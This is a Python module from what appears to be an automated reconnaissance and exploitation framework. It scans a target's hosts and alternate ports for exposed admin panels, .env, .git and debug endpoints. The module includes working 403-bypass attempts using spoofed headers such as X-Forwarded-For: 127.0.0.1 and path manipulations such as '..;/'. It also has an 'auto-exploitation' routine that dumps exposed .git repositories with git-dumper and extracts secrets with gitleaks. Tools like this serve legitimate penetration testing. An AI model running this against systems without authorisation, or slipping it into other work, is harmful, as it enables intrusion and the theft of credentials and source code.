"""
Admin Panel Discovery — Descobre painéis administrativos expostos.
Testa 80+ paths comuns em URLs válidas + portas alternativas.
"""
from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY
import json
import re
import shutil
from pathlib import Path
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

import base64
from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error

# ============================================================
# PATHS COMUNS DE ADMIN PANELS
# ============================================================
ADMIN_PATHS = [
    # Generic
    "/admin", "/admin/", "/admin/login", "/admin/login.php",
    "/administrator", "/administrator/", "/administrator/login",
    "/panel", "/panel/", "/cpanel", "/cpanel/",
    "/dashboard", "/dashboard/", "/console", "/console/",
    "/manager", "/manager/", "/manage", "/manage/",
    "/backend", "/backend/", "/controlpanel",
    "/sysadmin", "/superadmin", "/webadmin",
    "/admin-panel", "/admin_panel", "/adminpanel",
    "/login", "/login/", "/user/login", "/auth/login",

    # WordPress
    "/wp-admin", "/wp-admin/", "/wp-login.php",
    "/wp-admin/admin-ajax.php", "/wp-json/wp/v2/users",

    # Joomla
    "/administrator/index.php", "/administrator/manifests/files/joomla.xml",

    # Drupal
    "/user/login", "/admin/content", "/core/CHANGELOG.txt",

    # Laravel
    "/nova", "/nova/login", "/horizon", "/horizon/dashboard",
    "/telescope", "/log-viewer",

    # Django
    "/admin/login/?next=/admin/", "/djadmin/",

    # PHP / phpMyAdmin
    "/phpmyadmin", "/phpmyadmin/", "/pma", "/myadmin",
    "/phpMyAdmin", "/phpMyAdmin/", "/phpmyadmin/index.php",
    "/dbadmin", "/db", "/adminer", "/adminer.php",

    # Database
    "/pgadmin", "/pgadmin4", "/redis-commander",

    # Web Servers
    "/server-status", "/server-info", "/.env",
    "/nginx-status", "/status",

    # DevOps
    "/jenkins", "/jenkins/", "/jenkins/login",
    "/grafana", "/grafana/login", "/grafana/d",
    "/kibana", "/kibana/app/kibana",
    "/portainer", "/portainer/",
    "/traefik", "/traefik/dashboard/",
    "/rancher", "/argocd",

    # API / Docs
    "/swagger", "/swagger/", "/swagger-ui",
    "/swagger-ui.html", "/api-docs", "/api/docs",
    "/graphql", "/graphiql", "/playground",
    "/redoc", "/api/v1/docs", "/docs",

    # Config / Debug
    "/.git/config", "/.git/HEAD",
    "/.svn/entries", "/.svn/wc.db",
    "/debug", "/trace", "/actuator",
    "/actuator/health", "/actuator/env",
    "/info", "/__debug__/",

    # Email / Webmail
    "/webmail", "/webmail/", "/mail",
    "/roundcube", "/roundcube/",
    "/postfixadmin",

    # Monitoring
    "/nagios", "/zabbix", "/munin", "/cacti",
    "/prometheus", "/prometheus/graph",

    # File Managers
    "/filemanager", "/elfinder", "/files",

    # CMS
    "/wp-content/debug.log",
    "/wp-includes/version.php",
    "/craft/", "/craft/admin",
    "/typo3/", "/typo3/index.php",
    "/umbraco/", "/sitefinity",
    "/sitecore/login",
]

# Portas alternativas comuns para admin panels
ADMIN_PORTS = [8080, 8443, 9090, 3000, 4200, 8000, 8888, 9200, 5601, 8081, 2082, 2083, 2086, 2087, 10000]

# CMS fingerprints baseados em conteúdo
CMS_FINGERPRINTS = {
    "WordPress": ["wp-content", "wp-includes", "wp-json", "wordpress"],
    "Joomla": ["joomla", "com_content", "/media/jui/"],
    "Drupal": ["drupal", "sites/default", "core/misc/drupal"],
    "Laravel": ["laravel", "csrf-token", "Laravel"],
    "Django": ["csrfmiddlewaretoken", "__admin__", "django"],
    "Jenkins": ["jenkins", "Jenkins", "j_spring_security_check"],
    "Grafana": ["grafana", "Grafana"],
    "phpMyAdmin": ["phpmyadmin", "phpMyAdmin", "pma_"],
    "Kibana": ["kibana", "Kibana"],
    "Swagger": ["swagger", "Swagger UI", "swagger-ui"],
    "Spring Boot": ["actuator", "spring", "whitelabel"],
}

# ============================================================
# PATH CLASSIFICATION — Tags de contexto para cada achado
# ============================================================

# Arquivos sensíveis (informação exposta)
_SENSITIVE_FILE_PATTERNS = {
    "robots.txt", "crossdomain.xml", "crossdomain.jsp",
    "clientaccesspolicy.xml", "sitemap.xml", ".env",
    "CHANGELOG.txt", "version.php", "debug.log",
    "config.php", "config.yml", "config.json",
    "web.config", ".htaccess", ".htpasswd",
    "wp-config.php", "database.yml", "settings.py",
    "application.properties", "application.yml",
}

# Paths de API / documentação
_API_PATH_KEYWORDS = (
    "/swagger", "/api-docs", "/api/docs", "/redoc",
    "/graphql", "/graphiql", "/playground",
    "/api/v1", "/api/v2", "/api/v3",
    "/wp-json", "/api/gql",
)

# Debug / ferramentas de diagnóstico
_DEBUG_TOOL_KEYWORDS = (
    "/actuator", "/__debug__", "/debug", "/trace",
    "/server-status", "/server-info", "/nginx-status",
    "/status", "/health", "/info",
    "/telescope", "/horizon", "/log-viewer",
    "/prometheus", "/nagios", "/zabbix", "/munin",
    "/cacti", "/grafana",
)

# Config / Source Code Exposure
_CONFIG_EXPOSURE_KEYWORDS = (
    "/.git/", "/.svn/", "/.hg/",
    "/.env", "/.docker",
)

def classify_path(path: str) -> str:
    """Classifica um path em uma categoria contextual."""
    path_lower = path.lower()
    basename = path_lower.rsplit("/", 1)[-1]

    # 1. Arquivos sensíveis (match exato no basename)
    if basename in {p.lower() for p in _SENSITIVE_FILE_PATTERNS}:
        return "ARQUIVO SENSÍVEL"

    # 2. Config / Source Code Exposure
    if any(k in path_lower for k in _CONFIG_EXPOSURE_KEYWORDS):
        return "CONFIG EXPOSURE"

    # 3. Path API
    if any(k in path_lower for k in _API_PATH_KEYWORDS):
        return "PATH API"

    # 4. Debug / Tool
    if any(k in path_lower for k in _DEBUG_TOOL_KEYWORDS):
        return "DEBUG/TOOL"

    # 5. Default: Admin Panel
    return "ADMIN PANEL"


GENERIC_TITLES = [
    "login", "cpanel", "cpanel login", "admin", "administrator",
    "sign in", "sign-in", "signin", "log in", "log-in",
    "dashboard", "panel", "webmail", "webmail login",
    "welcome", "home", "index", "404", "not found",
    "page not found", "403 forbidden", "forbidden",
    "redirect", "301 moved", "error", "access denied",
    "roundcube webmail", "horde", "squirrelmail",
    "grafana", "kibana", "jenkins", "zabbix",
    "whm login", "whm", "plesk", "directadmin",
    "wordpress", "joomla", "drupal",
]

# V10.5: Signatures de WAF/Cloudflare challenge pages (falsos positivos de bypass)
WAF_CHALLENGE_SIGS = [
    "attention required", "cloudflare", "captcha", "challenge-platform",
    "cf-browser-verification", "just a moment", "cf-chl-bypass",
    "ray id", "performance & security by", "enable javascript",
    "checking your browser", "ddos-guard", "incapsula", "sucuri",
    "access denied | used cloudflare", "please wait...",
]

def normalize_title(title: str) -> str:
    """Normalize a page title for deduplication."""
    import re
    title = title.lower().strip()
    # Remove version numbers
    title = re.sub(r'v?\d+\.\d+[\.\d]*', '', title)
    # Remove extra whitespace
    title = re.sub(r'\s+', ' ', title).strip()
    # Remove common suffixes
    for suffix in [" - login", " login", " :: login", " | login"]:
        title = title.replace(suffix, "")
    return title


def clean_html_for_fingerprint(html: str) -> str:
    """Remove dynamic data to create a stable hash for deduplication."""
    import re
    # Remover CSRF tokens e nonces
    html = re.sub(r'name=["\']csrf.*?["\'][^>]*value=["\'].*?["\']', '', html, flags=re.I)
    html = re.sub(r'name=["\']csrf.*?["\'][^>]*content=["\'].*?["\']', '', html, flags=re.I)
    html = re.sub(r'name=["\']_token["\'][^>]*value=["\'].*?["\']', '', html, flags=re.I)
    
    # Remover timestamps e tokens grandes baseados em sessoes
    html = re.sub(r'\b\d{10}\b', '', html)  # Unix timestamps
    html = re.sub(r'\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}:\d{2}', '', html)
    html = re.sub(r'[a-f0-9]{32,64}', '', html)
    
    # Remover paths refletidos no HTML
    html = re.sub(r'/[a-zA-Z0-9_/%?=-]+', '', html)
    
    # Remover espacos e normalizar
    html = re.sub(r'\s+', ' ', html).strip()
    return html
 
 
def generate_raw_http(request_or_response) -> str:
    """Gera uma string raw de uma requisição ou resposta do httpx."""
    try:
        if hasattr(request_or_response, 'request'): # É uma resposta
            resp = request_or_response
            req = resp.request
            
            # Request Row
            try:
                target_path = req.url.raw_path.decode('ascii', errors='ignore')
            except AttributeError:
                target_path = getattr(req.url, 'path', '/')
            req_lines = [f"{req.method} {target_path} HTTP/1.1"]
            for k, v in req.headers.items():
                req_lines.append(f"{k}: {v}")
            req_raw = "\n".join(req_lines) + "\n\n"
            if req.content:
                req_raw += req.content.decode(errors='ignore')
                
            # Response Row
            res_lines = [f"HTTP/1.1 {resp.status_code} {resp.reason_phrase}"]
            for k, v in resp.headers.items():
                res_lines.append(f"{k}: {v}")
            res_raw = "\n".join(res_lines) + "\n\n"
            res_raw += resp.text if resp.text else ""
            
            return base64.b64encode(req_raw.encode()).decode(), base64.b64encode(res_raw.encode()).decode()
    except:
        pass
    return "", ""


def check_admin_path(client, base_url: str, path: str, baseline: dict = None) -> dict:
    """
    Testa um path de admin em uma URL base.
    Retorna dict com resultado ou None se não encontrado.
    """
    url = base_url.rstrip("/") + path
    try:
        resp = client.get(url)

        # Ignorar 404, 500, 502, 503
        if resp.status_code in (404, 500, 502, 503, 504):
            return None

        content = resp.text[:10000] if resp.text else ""
        content_len = len(content)

        # Baseline check para Soft 404
        if baseline and resp.status_code == baseline["status"]:
            baseline_len = baseline["length"]
            # Tolerância de 5% no tamanho do conteúdo
            if abs(content_len - baseline_len) <= max(50, baseline_len * 0.05):
                return None
            
            # Checagem estrutural rigorosa
            import hashlib
            cleaned = clean_html_for_fingerprint(content)
            chash = hashlib.sha256(cleaned.encode('utf-8')).hexdigest()
            if chash == baseline.get("hash"):
                return None

        # Verificar se é página real (não redirect genérico para home)
        final_url = str(resp.url)
        parsed_base = urlparse(base_url)
        parsed_final = urlparse(final_url)
        
        # V10.5: Anti-SSO False Positive (Google, Microsoft, Okta)
        # Se ocorreu um redirecionamento para um domínio externo de SSO, ignorar.
        if parsed_base.netloc.lower() != parsed_final.netloc.lower():
            sso_domains = [
                "accounts.google.com", "sites.google.com", "login.microsoftonline.com", 
                "okta.com", "auth0.com", "cloudflareaccess.com", "pingidentity.com", 
                "onelogin.com", "awsapps.com", "salesforce.com", "github.com"
            ]
            if any(sso in parsed_final.netloc.lower() for sso in sso_domains):
                return None

        content_lower = content.lower()
        
        # Soft-404 Strict HTML Redirect Checks
        # Often servers return 200 OK but inject a meta refresh to the homepage
        if "<meta http-equiv=\"refresh\"" in content_lower or "meta http-equiv='refresh'" in content_lower:
            return None
        if "window.location=" in content_lower or "window.location.replace" in content_lower or "window.location.href" in content_lower:
            return None

        # WAF/Cloudflare rejection - if blocked, do not consider an exposed admin panel
        if any(sig in content_lower for sig in WAF_CHALLENGE_SIGS):
            return None

        # Filter out purely generic 403 pages from common webservers if there's no actual admin signature
        if resp.status_code == 403 and len(content_lower) < 1000 and "forbidden" in content_lower:
            # Only keep it if the URL explicitly has a major CMS/admin keyword preventing pure brute force noise
            if not any(k in path.lower() for k in ["admin", "wp-", "phpmyadmin", ".git"]):
                return None

        # Detectar título
        title = ""
        import re
        title_match = re.search(r"<title>(.*?)</title>", content, re.I | re.S)
        if title_match:
            title = title_match.group(1).strip()[:100]
            
            # Mais um filtro de Soft-404: se retornou pro título base
            # mas procuramos um /cpanel/ ou /admin, é um fake 200.
            if baseline and baseline.get("title"):
                norm_base = normalize_title(baseline["title"])
                norm_current = normalize_title(title)
                if norm_base and norm_current == norm_base and len(content_lower) > 3000:
                    # Titulo identico a home, pagina grande (nao é só um form login pequeno). Fake redirect
                    return None

        # Detectar form de login
        has_login = bool(re.search(
            r'<input[^>]*type=["\']password["\']', content, re.I
        ))

        # Fingerprint CMS
        cms = None
        for cms_name, patterns in CMS_FINGERPRINTS.items():
            if any(p.lower() in content_lower for p in patterns):
                cms = cms_name
                break

        # Apenas retornar se parece ser algo real
        is_interesting = (
            has_login or
            cms or
            resp.status_code in (200, 401) or # Removido 403 puramente genérico
            "dashboard" in content_lower or
            resp.headers.get("content-type", "").startswith("application/json")
        )

        if is_interesting:
            import hashlib
            cleaned_content = clean_html_for_fingerprint(content)
            content_hash = hashlib.sha256(cleaned_content.encode('utf-8')).hexdigest()
            
            result = {
                "url": final_url,
                "path": path,
                "status": resp.status_code,
                "title": title,
                "cms": cms,
                "has_login_form": has_login,
                "response_size": content_len,
                "content_type": resp.headers.get("content-type", ""),
                "content_hash": content_hash,
                "category": classify_path(path)
            }
            
            # 403 Bypass: Tentar headers e path manipulation
            if resp.status_code == 403:
                bypass_headers_list = [
                    {"X-Forwarded-For": "127.0.0.1"},
                    {"X-Original-URL": path},
                    {"X-Rewrite-URL": path},
                    {"X-Custom-IP-Authorization": "127.0.0.1"},
                    {"X-Forwarded-Host": "localhost"},
                    {"X-Host": "localhost"},
                ]
                bypass_paths = [
                    path + "/./",
                    path + "..;/",
                    path.replace("/", "//"),
                    "/" + path.lstrip("/").capitalize(),
                    path + "%20",
                    path + "?",
                    path + "#",
                    path + ";",
                ]
                
                bypasses_found = []
                bypass_evidence = []  # V10.5: Evidência por bypass
                
                # Test header bypasses
                for bypass_h in bypass_headers_list:
                    try:
                        r = client.get(url, headers=bypass_h)
                        if r.status_code == 200:
                            # V10.5: Validar que NÃO é WAF/Cloudflare challenge
                            bypass_body = r.text.lower() if r.text else ""
                            if any(sig in bypass_body for sig in WAF_CHALLENGE_SIGS):
                                continue  # Falso positivo — página de challenge
                            header_name = list(bypass_h.keys())[0]
                            bypasses_found.append(f"Header {header_name}: {bypass_h[header_name]}")
                            # V10.5: Capturar raw HTTP DESTE bypass específico
                            bp_req, bp_res = generate_raw_http(r)
                            bypass_evidence.append({"method": f"Header {header_name}", "req": bp_req, "res": bp_res})
                    except Exception:
                        pass
                
                # Test path bypasses
                for bp in bypass_paths:
                    try:
                        test = base_url.rstrip("/") + bp
                        r = client.get(test)
                        if r.status_code == 200:
                            # V10.5: Validar que NÃO é WAF/Cloudflare challenge
                            bypass_body = r.text.lower() if r.text else ""
                            if any(sig in bypass_body for sig in WAF_CHALLENGE_SIGS):
                                continue  # Falso positivo — página de challenge
                            bypasses_found.append(f"Path: {bp}")
                            # V10.5: Capturar raw HTTP DESTE bypass específico
                            bp_req, bp_res = generate_raw_http(r)
                            bypass_evidence.append({"method": f"Path: {bp}", "req": bp_req, "res": bp_res})
                    except Exception:
                        pass
                
                # V10.5: Só reportar bypass se temos evidência real (não WAF)
                if bypasses_found and bypass_evidence:
                    result["bypass_found"] = True
                    result["bypass_methods"] = bypasses_found
                    result["status"] = "403 → BYPASS"
                    # V10.5: Usar raw HTTP do PRIMEIRO bypass confirmado (não do último r do loop)
                    result["raw_request"] = bypass_evidence[0]["req"]
                    result["raw_response"] = bypass_evidence[0]["res"]
            
            return result

    except Exception:
        pass

    return None


def run(context: dict):
    """Executa descoberta de admin panels."""
    import httpx
    import uuid
    
    target = context.get("target")
    if not target:
        raise ValueError("Target required")

    info(
        f"\n🟥───────────────────────────────────────────────────────────🟥\n"
        f"   🔐 {C.BOLD}{C.CYAN}ADMIN PANEL DISCOVERY{C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END}\n"
        f"🟥───────────────────────────────────────────────────────────🟥\n"
    )

    outdir = ensure_outdir(target, "admin")

    # Ler URLs válidas
    urls_files = [
        Path("output") / target / "domain" / "urls_valid.txt",
        Path("output") / target / "urls_valid.txt",
    ]

    valid_urls = set()
    for f in urls_files:
        if f.exists():
            valid_urls.update(l.strip() for l in f.read_text().splitlines() if l.strip())

    if not valid_urls:
        warn("⚠️ Nenhuma URL válida encontrada. Execute o módulo domain primeiro.")
        return []

    # Extrair base URLs únicas (scheme + host)
    base_urls = set()
    for url in valid_urls:
        parsed = urlparse(url)
        # 🛡️ Garantir que a URL base pertence ao TARGET escopo!
        if parsed.netloc == target or parsed.netloc.endswith("." + target):
            base = f"{parsed.scheme}://{parsed.netloc}"
            base_urls.add(base)

    # Adicionar portas alternativas
    extended_bases = set(base_urls)
    for base in list(base_urls):
        parsed = urlparse(base)
        host = parsed.hostname
        for port in ADMIN_PORTS:
            extended_bases.add(f"http://{host}:{port}")
            extended_bases.add(f"https://{host}:{port}")

    info(f"   📋 {len(base_urls)} hosts base + {len(ADMIN_PORTS)} portas alternativas")
    info(f"   🔍 Analisando conexões ativas nas bases estendidas...")

    # Gerar Baselines (Soft 404) e cliente global
    baselines = {}
    valid_bases = set()
    
    # httpx configs
    limits = httpx.Limits(max_keepalive_connections=50, max_connections=100)
    with httpx.Client(timeout=4, verify=False, follow_redirects=True, limits=limits) as client:
        client.headers.update({"User-Agent": DEFAULT_USER_AGENT})
        
        info("   🛡️  Obtendo Baseline (Catch-all check) para evitar falsos positivos...")
        
        def check_baseline(base_url):
            try:
                import uuid
                rand_path = f"/does_not_exist_{uuid.uuid4().hex[:8]}"
                r = client.get(base_url.rstrip("/") + rand_path)
                import hashlib
                cleaned = clean_html_for_fingerprint(r.text)
                chash = hashlib.sha256(cleaned.encode('utf-8')).hexdigest()
                
                # Setup base title mapping for strict soft-404 match
                base_title = ""
                import re
                t_match = re.search(r"<title>(.*?)</title>", r.text, re.I | re.S)
                if t_match:
                    base_title = t_match.group(1).strip()[:100]
                
                return base_url, {"status": r.status_code, "length": len(r.text) if r.text else 0, "hash": chash, "title": base_title}
            except Exception:
                return base_url, None

        total_bases = len(extended_bases)
        done_bases = 0
        with ThreadPoolExecutor(max_workers=35) as base_executor:
            base_futures = [base_executor.submit(check_baseline, b) for b in extended_bases]
            for fut in as_completed(base_futures):
                done_bases += 1
                if done_bases % 10 == 0 or done_bases == total_bases:
                    pct = int((done_bases / total_bases) * 100)
                    print(f"   [Baseline Total: {total_bases} | Atual: {done_bases}] {pct}% completo...", end="\r")
                
                try:
                    b, res = fut.result()
                    if res:
                        baselines[b] = res
                        valid_bases.add(b)
                except Exception:
                    pass
        print("") # Quebra de linha apos o progresso
        

        if not valid_bases:
            warn("   ⚠️ Nenhuma porta web de admin respondeu. (Todas instáveis/fechadas).")
            return []

        info(f"   🚀 Testando {len(ADMIN_PATHS)} paths em {len(valid_bases)} bases ativas...")
        total_tasks = len(valid_bases) * len(ADMIN_PATHS)
        info(f"   ⏱️  Total de testes otimizados: ~{total_tasks}")

        # Executar testes em paralelo
        found_panels = []
        seen_hashes = set()
        seen_titles_per_host = set()

        with ThreadPoolExecutor(max_workers=35) as executor:
            futures = {}
            for base in valid_bases:
                for path in ADMIN_PATHS:
                    future = executor.submit(check_admin_path, client, base, path, baselines.get(base))
                    futures[future] = (base, path)

            done_count = 0
            for future in as_completed(futures):
                done_count += 1
                if done_count % 20 == 0 or done_count == total_tasks:
                    pct = int((done_count / total_tasks) * 100)
                    print(f"   [Total: {total_tasks} | Atual: {done_count}] {pct}% completo... ({len(found_panels)} encontrados)", end="\r")

                try:
                    result = future.result()
                    if result:
                        norm_url = result["url"].rstrip("/").lower()
                        host_domain = urlparse(norm_url).netloc
                        
                        # Dedup Hash exato
                        content_hash = result.get("content_hash", "")
                        hash_key = f"{host_domain}_{content_hash}"
                        if hash_key in seen_hashes:
                            continue
                        seen_hashes.add(hash_key)
                        
                        # Dedup Título por host
                        title = result.get("title", "")
                        norm_title = normalize_title(title)
                        if norm_title:
                            title_key = f"{host_domain}_{norm_title}"
                            if title_key in seen_titles_per_host:
                                continue
                            seen_titles_per_host.add(title_key)
                        
                        found_panels.append(result)
                        
                        status_val = result["status"]
                        status_color = C.RED if status_val in (200, "403 → BYPASS") else C.YELLOW
                        status_str = str(status_val) if isinstance(status_val, int) else status_val
                            
                        login_icon = "🔑" if result["has_login_form"] else "📄"
                        cms_str = f" [{result['cms']}]" if result.get("cms") else ""
                        info(f"   {login_icon} {status_color}[{status_str}]{C.END} {result['url']}{cms_str}")
                except Exception:
                    pass

    print("")  # Newline

    unique_panels = found_panels
    
    # ---------------------------------------------------------
    # Auto-Exploitation: GitLeaks for exposed .git directories
    # ---------------------------------------------------------
    import subprocess
    git_exposures = [p["url"] for p in unique_panels if "/.git/" in p["url"] and p["status"] == 200]
    if git_exposures:
        info(f"\n   [!] Diretórios .git expostos detectados! Tentando clone e extração de credenciais...")
        git_dumper = shutil.which("git-dumper")
        gitleaks = shutil.which("gitleaks")
        
        if git_dumper and gitleaks:
            for git_url in git_exposures:
                base_git_url = git_url.split("/.git/")[0] + "/.git/"
                repo_dir = outdir / "git_dump"
                if repo_dir.exists():
                    shutil.rmtree(repo_dir)
                    
                info(f"   [i] Baixando repositório de {base_git_url} com git-dumper...")
                subprocess.run(
                    [git_dumper, base_git_url, str(repo_dir)],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                
                if repo_dir.exists():
                    info(f"   [i] Executando GitLeaks no repositório clonado...")
                    gitleaks_report = outdir / "gitleaks_report.json"
                    subprocess.run(
                        [gitleaks, "detect", "--source", str(repo_dir), "--report-path", str(gitleaks_report), "--report-format", "json"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    
                    if gitleaks_report.exists() and gitleaks_report.stat().st_size > 5:
                        try:
                            leaks = json.loads(gitleaks_report.read_text())
                            if leaks:
                                success(f"   🚨 {C.PURPLE}GitLeaks encontrou {len(leaks)} secrets expostos!{C.END}")
                                for leak in leaks:
                                    unique_panels.append({
                                        "url": base_git_url,
                                        "path": leak.get("File", ""),
                                        "cms": "GitLeaks Exfiltration",
                                        "has_login_form": False,
                                        "status": "CRITICAL",
                                        "title": f"Secret Leak: {leak.get('Description', 'Key')}",
                                        "response_size": 0,
                                        "content_type": "secret/gitleaks",
                                        "content_hash": leak.get("Secret", "")
                                    })
                        except Exception as e:
                            pass
        else:
            warn("   ⚠️ 'git-dumper' ou 'gitleaks' não instalados. Pulei o clone do repositório.")

    # Salvar resultados
    if unique_panels:
        output_file = outdir / "admin_panels.json"
        output_file.write_text(json.dumps(unique_panels, indent=2, ensure_ascii=False))
        success(f"\n   🔐 {len(unique_panels)} admin panels encontrados!")
        success(f"   📂 Salvos em {output_file}")

        # Stats
        with_login = sum(1 for p in unique_panels if p["has_login_form"])
        cms_count = sum(1 for p in unique_panels if p.get("cms"))
        open_200 = sum(1 for p in unique_panels if p["status"] == 200 or p["status"] == "403 → BYPASS")
        auth_required = sum(1 for p in unique_panels if isinstance(p["status"], int) and p["status"] in (401, 403))

        info(f"   📊 Stats:")
        info(f"      Abertos/Bypass: {C.RED}{open_200}{C.END}")
        info(f"      Auth required (401/403): {C.YELLOW}{auth_required}{C.END}")
        info(f"      Com form de login: {with_login}")
        info(f"      CMS detectado: {cms_count}")
    else:
        warn("   ⚠️ Nenhum admin panel encontrado.")

    return unique_panels
